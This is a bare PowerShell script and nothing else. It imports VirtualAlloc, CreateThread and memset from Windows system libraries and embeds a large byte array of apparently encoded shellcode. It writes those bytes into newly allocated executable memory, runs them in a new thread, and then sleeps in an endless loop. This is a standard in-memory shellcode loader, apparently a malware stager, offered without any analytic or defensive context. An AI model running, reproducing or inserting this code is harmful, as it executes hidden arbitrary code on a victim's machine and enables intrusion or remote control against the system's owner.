$R9Un = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $R9Un -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x22,0xd0,0x4b,0x2f,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x6a,0x13,0x03,0x6a,0x13,0x83,0xc2,0x26,0x32,0xbe,0xd3,0xce,0x30,0x41,0x2c,0x0e,0x55,0xcb,0xc9,0x3f,0x55,0xaf,0x9a,0x6f,0x65,0xbb,0xcf,0x83,0x0e,0xe9,0xfb,0x10,0x62,0x26,0x0b,0x91,0xc9,0x10,0x22,0x22,0x61,0x60,0x25,0xa0,0x78,0xb5,0x85,0x99,0xb2,0xc8,0xc4,0xde,0xaf,0x21,0x94,0xb7,0xa4,0x94,0x09,0xbc,0xf1,0x24,0xa1,0x8e,0x14,0x2d,0x56,0x46,0x16,0x1c,0xc9,0xdd,0x41,0xbe,0xeb,0x32,0xfa,0xf7,0xf3,0x57,0xc7,0x4e,0x8f,0xa3,0xb3,0x50,0x59,0xfa,0x3c,0xfe,0xa4,0x33,0xcf,0xfe,0xe1,0xf3,0x30,0x75,0x18,0x00,0xcc,0x8e,0xdf,0x7b,0x0a,0x1a,0xc4,0xdb,0xd9,0xbc,0x20,0xda,0x0e,0x5a,0xa2,0xd0,0xfb,0x28,0xec,0xf4,0xfa,0xfd,0x86,0x00,0x76,0x00,0x49,0x81,0xcc,0x27,0x4d,0xca,0x97,0x46,0xd4,0xb6,0x76,0x76,0x06,0x19,0x26,0xd2,0x4c,0xb7,0x33,0x6f,0x0f,0xdf,0xf0,0x42,0xb0,0x1f,0x9f,0xd5,0xc3,0x2d,0x00,0x4e,0x4c,0x1d,0xc9,0x48,0x8b,0x62,0xe0,0x2d,0x03,0x9d,0x0b,0x4e,0x0d,0x59,0x5f,0x1e,0x25,0x48,0xe0,0xf5,0xb5,0x75,0x35,0x63,0xb3,0xe1,0x76,0xdc,0xac,0x72,0x1e,0x1f,0xd3,0x75,0x64,0x96,0x35,0x25,0xca,0xf9,0xe9,0x85,0xba,0xb9,0x59,0x6d,0xd1,0x35,0x85,0x8d,0xda,0x9f,0xae,0x27,0x35,0x76,0x86,0xdf,0xac,0xd3,0x5c,0x7e,0x30,0xce,0x18,0x40,0xba,0xfd,0xdd,0x0e,0x4b,0x8b,0xcd,0xe6,0xbb,0xc6,0xac,0xa0,0xc4,0xfc,0xdb,0x4c,0x51,0xfb,0x4d,0x1b,0xcd,0x01,0xab,0x6b,0x52,0xf9,0x9e,0xe0,0x5b,0x6f,0x61,0x9e,0xa3,0x7f,0x61,0x5e,0xf2,0x15,0x61,0x36,0xa2,0x4d,0x32,0x23,0xad,0x5b,0x26,0xf8,0x38,0x64,0x1f,0xad,0xeb,0x0c,0x9d,0x88,0xdc,0x92,0x5e,0xff,0xdc,0xef,0x88,0x39,0xab,0x01,0x09;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$PR3=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($PR3.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$PR3,0,0,0);for (;;){Start-sleep 60};
